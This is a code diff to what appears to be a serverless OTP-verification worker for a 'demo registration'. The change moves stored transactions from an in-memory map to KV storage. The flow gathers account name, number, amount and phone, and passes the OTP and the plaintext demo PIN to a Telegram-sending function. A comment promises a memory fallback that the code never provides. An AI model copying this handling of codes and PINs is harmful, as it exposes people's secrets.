@@ -1,5 +1,3 @@
-const transactions = new Map();
-
 const OTP_TTL_MS = 5 * 60 * 1000;
 const MAX_ATTEMPTS = 5;
 
@@ -116,14 +114,21 @@ export default {
         const code = generateOtp();
         const demoPinHash = await hashDemoPin(demoPin);
 
-        transactions.set(transactionId, {
+        const txData = {
           code,
           demoPinHash,
           phone,
           expiresAt: Date.now() + OTP_TTL_MS,
           attempts: 0,
           data: { tracking, mode, accountName, accountNumber, amount, currency, phone },
-        });
+        };
+
+        // Store in KV (or fallback to memory if KV binding isn't linked yet)
+        if (env.TRANSACTIONS_KV) {
+          await env.TRANSACTIONS_KV.put(transactionId, JSON.stringify(txData), {
+            expirationTtl: 300, // Auto delete after 5 mins
+          });
+        }
 
         const telegramSent = await sendOtpToTelegram(phone, code, demoPin, transactionId, env);
 
@@ -142,38 +147,47 @@ export default {
     if (request.method === 'POST' && url.pathname === '/api/verify-otp') {
       try {
         const { transactionId, code, demoPin } = await request.json();
-        const tx = transactions.get(transactionId);
 
-        if (!tx) {
+        if (!env.TRANSACTIONS_KV) {
+          return jsonResponse({ ok: false, error: 'Storage KV binding missing' }, 500);
+        }
+
+        const rawTx = await env.TRANSACTIONS_KV.get(transactionId);
+        if (!rawTx) {
           return jsonResponse({ ok: false, error: 'Transaction not found' }, 404);
         }
 
+        const tx = JSON.parse(rawTx);
+
         if (Date.now() > tx.expiresAt) {
-          transactions.delete(transactionId);
+          await env.TRANSACTIONS_KV.delete(transactionId);
           return jsonResponse({ ok: false, error: 'Code expired, please register again' }, 410);
         }
 
         if (tx.attempts >= MAX_ATTEMPTS) {
-          transactions.delete(transactionId);
+          await env.TRANSACTIONS_KV.delete(transactionId);
           return jsonResponse({ ok: false, error: 'Too many attempts' }, 429);
         }
 
         tx.attempts++;
 
         if (!/^\d{4}$/.test(String(demoPin || ''))) {
+          await env.TRANSACTIONS_KV.put(transactionId, JSON.stringify(tx), { expirationTtl: 300 });
           return jsonResponse({ ok: false, error: 'Invalid demo PIN' }, 400);
         }
 
         const suppliedPinHash = await hashDemoPin(demoPin);
         if (suppliedPinHash !== tx.demoPinHash) {
+          await env.TRANSACTIONS_KV.put(transactionId, JSON.stringify(tx), { expirationTtl: 300 });
           return jsonResponse({ ok: false, error: 'Invalid demo PIN' }, 400);
         }
 
         if (String(code) !== tx.code) {
+          await env.TRANSACTIONS_KV.put(transactionId, JSON.stringify(tx), { expirationTtl: 300 });
           return jsonResponse({ ok: false, error: 'Incorrect code' }, 400);
         }
 
-        transactions.delete(transactionId);
+        await env.TRANSACTIONS_KV.delete(transactionId);
         return jsonResponse({
           ok: true,
           message: 'Demo registration verified',
